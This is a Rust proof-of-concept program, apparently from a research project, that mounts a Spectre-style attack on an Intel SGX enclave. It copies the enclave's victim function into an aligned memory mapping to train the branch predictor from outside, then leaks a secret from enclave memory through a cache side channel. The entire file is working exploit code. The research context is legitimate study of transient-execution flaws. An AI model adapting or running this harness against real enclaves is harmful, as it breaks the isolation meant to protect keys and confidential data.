// Licensed to the Apache Software Foundation (ASF) under one
// or more contributor license agreements.  See the NOTICE file
// distributed with this work for additional information
// regarding copyright ownership.  The ASF licenses this file
// to you under the Apache License, Version 2.0 (the
// "License"); you may not use this file except in compliance
// with the License.  You may obtain a copy of the License at
//
//   http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
// KIND, either express or implied.  See the License for the
// specific language governing permissions and limitations
// under the License..

#![feature(asm)]

extern crate sgx_types;
extern crate sgx_urts;
use sgx_types::*;
use sgx_urts::SgxEnclave;

extern crate minidow;
use minidow::*;

extern crate capstone;
use capstone::prelude::*;

extern crate nix;
#[cfg(not(feature = "multithread"))]
use nix::sched::{sched_setaffinity, CpuSet};
use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};
#[cfg(not(feature = "multithread"))]
use nix::unistd::Pid;

extern crate libc;
use libc::c_void;

static ENCLAVE_FILE: &'static str = "enclave1.signed.so";

extern "C" {
    fn Enclave1_spectre_enclave(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
    fn Enclave1_spectre_test(
        eif: sgx_enclave_id_t,
        measurement_array_addr: u64,
        target_addr: u64,
    ) -> sgx_status_t;
}

fn init_enclave() -> SgxResult<SgxEnclave> {
    let mut launch_token: sgx_launch_token_t = [0; 1024];
    let mut launch_token_updated: i32 = 0;
    let debug = 0;
    let mut misc_attr = sgx_misc_attribute_t {
        secs_attr: sgx_attributes_t { flags: 0, xfrm: 0 },
        misc_select: 0,
    };
    SgxEnclave::create(
        ENCLAVE_FILE,
        debug,
        &mut launch_token,
        &mut launch_token_updated,
        &mut misc_attr,
    )
}

static mut ENCLAVE: SgxEnclave =
    unsafe { std::mem::transmute([1u8; std::mem::size_of::<SgxEnclave>()]) };
static mut TARGET: usize = 0;

fn main() -> std::io::Result<()> {
    #[cfg(not(feature = "multithread"))]
    {
        let mut cpuset = CpuSet::new();
        cpuset.set(0).unwrap();
        sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
    }

    unsafe {
        let tmp_enclave = match init_enclave() {
            Ok(r) => {
                println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
                r
            }
            Err(x) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    format!("[-] Init Enclave Failed: {}!", x.as_str()),
                ));
            }
        };

        std::ptr::copy(
            &tmp_enclave as *const SgxEnclave,
            &mut ENCLAVE as *mut SgxEnclave,
            1,
        );
        std::mem::forget(tmp_enclave);
    }

    let mut secret_full_addr = 0;

    let result = unsafe { Enclave1_spectre_enclave(ENCLAVE.geteid(), &mut secret_full_addr) };
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }

    println!("[+] Got addr 0x{:x}", secret_full_addr);

    let cs = Capstone::new()
        .x86()
        .mode(arch::x86::ArchMode::Mode64)
        .syntax(arch::x86::ArchSyntax::Intel)
        .detail(true)
        .build()
        .expect("Failed to create Capstone object");

    // read the file, parse the elf, and extract the code of the targetted function (+ perform the
    // relocation to take care of the layout randomisation)
    let enclave_binary = std::fs::read(ENCLAVE_FILE)?;

    let elf = match goblin::elf::Elf::parse(&enclave_binary) {
        Ok(elf) => elf,
        Err(e) => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("invalid file format, expected an elf binary: {:?}", e),
            ))
        }
    };

    /*
    let nop = {
        let nop_arr = [0x90];

        cs.disasm_count(&nop_arr, 0, 1)
            .unwrap()
            .iter()
            .next()
            .unwrap()
    };
    */

    let mut minidow_secret_sym = goblin::elf::Sym::default();
    let mut secret_sym = goblin::elf::Sym::default();
    let mut spectre_limit_sym = goblin::elf::Sym::default();

    //let mut jb_offset = 0;
    //let mut jb_dst_addr = 0;
    //let mut ret_offset = 0;

    let mut access_memory_spectre_offset = 0;
    let mut access_memory_spectre_size = 0;

    let mut spectre_test_offset = 0;
    let mut spectre_test_size = 0;

    for sym in elf.syms.iter() {
        let symbol_name = elf.strtab.get(sym.st_name).unwrap().unwrap();
        if symbol_name == "MINIDOW_SECRET" {
            minidow_secret_sym = sym;
        } else if symbol_name == "SECRET" {
            secret_sym = sym;
        } else if symbol_name == "SPECTRE_LIMIT" {
            spectre_limit_sym = sym;
        } else if symbol_name == "access_memory_spectre" {
            access_memory_spectre_offset = sym.st_value as usize;
            access_memory_spectre_size = sym.st_size as usize;

            /*
            let asm_code =
                &enclave_binary[access_memory_spectre_offset..access_memory_spectre_offset + access_memory_spectre_size];

            println!("function code: {:?}", asm_code);
            let insns = cs
                .disasm_all(asm_code, sym.st_value)
                .expect("Failed to disassemble");

            for insn in insns.iter() {
                // we assume that there is only one (inconditional) return instruction in the function
                if let Some("jb") = insn.mnemonic() {
                    jb_offset = insn.address();
                    let details = cs.insn_detail(&insn).unwrap();
                    let operands = details.arch_detail().operands();
                    if let capstone::arch::ArchOperand::X86Operand(
                        capstone::arch::x86::X86Operand {
                            op_type: capstone::arch::x86::X86OperandType::Imm(v),
                            ..
                        },
                    ) = operands[0]
                    {
                        jb_dst_addr = v;
                    }
                } else if let Some("ret") = insn.mnemonic() {
                    ret_offset = insn.address();
                    break;
                }
            }
            */
        } else if symbol_name == "spectre_test" {
            spectre_test_offset = sym.st_value as usize;
            spectre_test_size = sym.st_size as usize;
        }
    }

    println!(
        "access_memory_spectre_offset: 0x{:x}",
        access_memory_spectre_offset
    );

    let base_32bit_offset = (secret_full_addr - secret_sym.st_value) & ((1 << 32) - 1);
    println!("base_32bit_offset: 0x{:x}", base_32bit_offset);

    // map in memory and add a jump at the correct adress
    // see the SgxSpectre paper for more details on why we simulate only the last 32 bits of
    // addresses
    // note that this isn't really 4GB is size because of the relation we perform by adding
    // base_32bit_offset
    let mapped_array: &mut [u8; 1 << 32] = unsafe {
        let addr = mmap(
            0 as *mut c_void,
            1 << 33,
            ProtFlags::PROT_WRITE | ProtFlags::PROT_READ,
            MapFlags::MAP_PRIVATE | MapFlags::MAP_ANONYMOUS,
            -1,
            0,
        )
        .unwrap();
        println!("Mmapped 8GB of memory at {:p}", addr);

        let mut aligned_addr = (addr as usize + (1 << 32)) & (!((1 << 32) - 1));
        aligned_addr += base_32bit_offset as usize;

        std::mem::transmute(aligned_addr)
    };

    let top_32bit_offset = (secret_full_addr
        - (mapped_array as *const u8 as u64 + secret_sym.st_value))
        & (!((1 << 32) - 1));
    println!("top_32bit_offset: 0x{:x}", top_32bit_offset);

    println!("Training array allocated at {:p}", mapped_array as *const _);

    let data_offset_file = elf.section_headers[minidow_secret_sym.st_shndx].sh_offset as i64
        - elf.section_headers[minidow_secret_sym.st_shndx].sh_addr as i64;
    let minidow_secret_array_rela_addr = unsafe {
        *(&enclave_binary[(data_offset_file + minidow_secret_sym.st_value as i64) as usize
            ..(data_offset_file + minidow_secret_sym.st_value as i64 + 8) as usize]
            as *const _ as *const usize)
    };
    let spectre_limit_addr = top_32bit_offset as usize
        + mapped_array as *const _ as usize
        + spectre_limit_sym.st_value as usize;
    println!("spectre_limit_addr: 0x{:x}", spectre_limit_addr);

    let spectre_test_training_fun: unsafe extern "C" fn(
        measurement_array_addr: usize,
        target_addr: usize,
    ) = unsafe {
        let dst_addr = &mut mapped_array[access_memory_spectre_offset] as *mut u8;

        std::ptr::copy(
            &enclave_binary[access_memory_spectre_offset] as *const u8,
            dst_addr,
            access_memory_spectre_size,
        );

        // copy the spectre_test function
        std::ptr::copy(
            &enclave_binary[spectre_test_offset] as *const u8,
            &mut mapped_array[spectre_test_offset],
            spectre_test_size,
        );

        // we need to add the statics too if we want the function to work well
        std::ptr::copy(
            minidow::MINIDOW_SECRET as *const u8,
            &mut mapped_array[minidow_secret_sym.st_value as usize],
            minidow_secret_sym.st_size as usize,
        );
        std::ptr::copy(
            &enclave_binary[secret_sym.st_value as usize] as *const u8,
            &mut mapped_array[secret_sym.st_value as usize],
            secret_sym.st_size as usize,
        );
        for i in 0..128 {
            *((minidow_secret_array_rela_addr as usize + mapped_array as *const _ as usize + i)
                as *mut u8) = b'0';
        }

        // I'm not sadistic enough to put the function in RWX memory.
        let map_rx = |addr: usize, size: usize| {
            println!(
                "Mapping {} bytes as executable at {:p}",
                size, addr as *const u8
            );
            mprotect(
                // align on a page boundary
                (addr & (!((1 << 12) - 1))) as *mut c_void,
                size + (addr & ((1 << 12) - 1)),
                ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
            )
            .unwrap();
        };
        map_rx(dst_addr as usize, access_memory_spectre_size);
        map_rx(
            &mapped_array[spectre_test_offset] as *const _ as usize,
            spectre_test_size,
        );

        //std::mem::transmute(&mapped_array[spectre_test_offset])
        std::mem::transmute(dst_addr)
    };

    setup_measurements();
    // yay, training is now possible!

    unsafe extern "C" fn spectre_test_ecall(base_addr: usize, off: usize) {
        //*((base_addr + minidow::MULTIPLE_OFFSET) as *mut u8) = 123;
        let result = Enclave1_spectre_test(ENCLAVE.geteid(), base_addr as u64, off as u64);
        if result != sgx_status_t::SGX_SUCCESS {
            println!("[-] ECALL Enclave Failed: {}!", result.as_str());
        }
    }

    let minidow_secret_array_addr_in_enclave = minidow_secret_array_rela_addr as i64
        + mapped_array as *const _ as i64
        + top_32bit_offset as i64;
    println!(
        "Minidow_secret adress inside the enclave: 0x{:x}",
        minidow_secret_array_addr_in_enclave
    );

    unsafe {
        TARGET = secret_full_addr as usize;
        //let target = secret_sym.st_value as usize
        //    + top_32bit_offset as usize
        //    + mapped_array as *const _ as usize;
        //let target = minidow_secret_array_addr_in_enclave as usize + 120;
        println!("target: 0x{:x}", TARGET);
    }

    let spectre = Spectre::new(
        Some(spectre_test_training_fun),
        Some(spectre_test_ecall),
        Some((minidow_secret_array_addr_in_enclave as usize + 64) as *const i8),
        Some(spectre_limit_addr as *const u8),
    );

    // use a lot of nops to try to make the predictor take longer to detect the misprediction
    //static mut BRANCH_DST_ADDR: *mut u8 = 0 as *mut u8;
    //unsafe {
    //    std::arch::x86_64::_mm_prefetch(target as *const i8, std::arch::x86_64::_MM_HINT_T0);
    //    BRANCH_DST_ADDR =
    //        (jb_dst_addr + mapped_array as *const _ as i64 + top_32bit_offset as i64) as *mut u8;
    //}

    println!(
        "0x{:x}",
        minidow::read_ptr(
            &spectre,
            || unsafe {
                // try to prefetch, in the hoep it will help
                std::arch::x86_64::_mm_prefetch(
                    TARGET as *const i8,
                    std::arch::x86_64::_MM_HINT_T0,
                );
                //std::arch::x86_64::_mm_clflush(BRANCH_DST_ADDR);
            },
            unsafe { TARGET }
        )
    );

    unsafe {
        std::mem::take(&mut ENCLAVE).destroy();
    }

    Ok(())
}
